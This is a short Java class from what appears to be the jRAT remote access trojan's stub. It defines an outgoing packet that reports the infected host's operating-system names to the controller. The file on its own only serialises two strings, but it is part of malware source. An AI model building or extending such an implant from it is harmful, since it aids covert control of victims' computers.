package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {

	private String sOs;
	private String lOs;

	public Packet16InitOperatingSystem(String sOs, String lOs) {
		this.sOs = sOs;
		this.lOs = lOs;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(sOs);
		sw.writeLine(lOs);
	}

	@Override
	public byte getPacketId() {
		return (byte) 16;
	}
}
